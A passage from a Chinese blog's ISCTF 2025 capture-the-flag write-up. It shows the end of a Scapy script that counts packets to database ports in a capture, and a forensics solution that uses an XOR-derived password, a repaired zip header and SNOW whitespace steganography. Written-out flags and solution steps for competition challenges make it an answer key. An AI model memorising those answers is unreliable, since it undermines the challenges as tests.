class="line"></span><br><span class="line">                dport = <span class="built_in">int</span>(pkt[TCP].dport)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> dport <span class="keyword">in</span> DB_PORTS <span class="keyword">or</span> sport <span class="keyword">in</span> DB_PORTS:</span><br><span class="line"></span><br><span class="line">                    pkt_counts[src] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># SYN packets: flag 0x02</span></span><br><span class="line"></span><br><span class="line">                    flags = pkt[TCP].flags</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Scapy may present flags as int-like</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">int</span>(flags) &amp; <span class="number">0x02</span>:</span><br><span class="line"></span><br><span class="line">                            syn_counts[src] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">except</span> Exception:</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># fallback: string check</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&#x27;S&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(flags):</span><br><span class="line"></span><br><span class="line">                            syn_counts[src] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pkt_counts:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未检测到到常见数据库端口的流量。&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;按 TCP 包数量排序的来源 IP（目标为常见数据库端口）：&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ip, cnt <span class="keyword">in</span> <span class="built_in">sorted</span>(pkt_counts.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ip&#125;</span>\tpackets=<span class="subst">&#123;cnt&#125;</span>\tSYNs=<span class="subst">&#123;syn_counts.get(ip,<span class="number">0</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>剩下的脚本略</p>
<p>来源 IP 及注册相关请求计数（降序）:</p>
<p>192.168.37.177 161</p>
<p>192.168.37.87 106</p>
<p>192.168.37.1 89</p>
<p>192.168.37.3 28</p>
<p>192.168.37.100 24</p>
<p>192.168.37.200 7</p>
<p>Flag：ISCTF{192.168.37.177}</p>
<h2 id="湖心亭看雪"><a href="#湖心亭看雪" class="headerlink" title="湖心亭看雪"></a>湖心亭看雪</h2><p>查看test.py，根据提供的代码和注释，这是一个异或（XOR）解密问题。</p>
<p>已知：</p>
<ol>
<li><p>c &#x3D; a ^ b</p>
</li>
<li><p>b &#x3D; b’blueshark’</p>
</li>
<li><p>c 的十六进制值为 53591611155a51405e</p>
</li>
</ol>
<p>根据异或运算的性质 a &#x3D; c ^ b，我们可以反向计算出 a。</p>
<p>解密结果为：<br>b’15ctf2025’</p>
<p>这像是密码</p>
<p><img src="https://img.cdn1.vip/i/69540b73ca263_1767115635.webp" alt="hajimi"></p>
<p>用010editor打开湖心亭.jpg，发现文件尾有多余的数据，是一个压缩包，但是文件头缺少了，补上50 4B 03 04，提取zip，用15ctf2025作为口令解压</p>
<p><img src="https://img.cdn1.vip/i/69540b9592beb_1767115669.webp" alt="hajimi"><br>解压得到txt，发现有隐藏字符，结合题意，猜测是snow隐写，密码接着用15ctf2025，得到flag</p>
<p>end  </p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">持之以 恒</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://cyh-32.github.io/2025/12/30/isctf2025-writeup/">http://cyh-32.github.io/2025/12/30/isctf2025-writeup/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">持之以 恒</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="https://img.cdn1.vip/i/69549d8c8a6fe_1767153036.webp" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="https://img.cdn1.vip/i/69549d530b95a_1767152979.webp" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="far fa-dot-circle"></i>&nbsp;本篇
            </div>
            <div class="card">
                <a href="/2025/12/30/isctf2025-writeup/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="ISCTF2025_writeup">
                        
                        <span class="card-title">ISCTF2025_writeup</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            队伍名称：NISA_Shell_We_Dance?队伍排名：总榜：104 新生榜：18所属院校及赛道：福建师范大学 新生赛道  
在写这篇 writeup 之前，首先感谢 ISCTF 2025 的出题人们设计了这样有趣且富有挑战性的题目，也
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-12-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            持之以 恒
                            
                        </span>
                    </div>
                </div>

                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2025/12/30/first-blog/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="first blog">
                        
                        <span class="card-title">first blog</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-12-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            持之以 恒
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2026</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">持之以 恒</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">10.6k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/cyh-32/cyh-32.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:3551803481@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3551803481" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3551803481" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
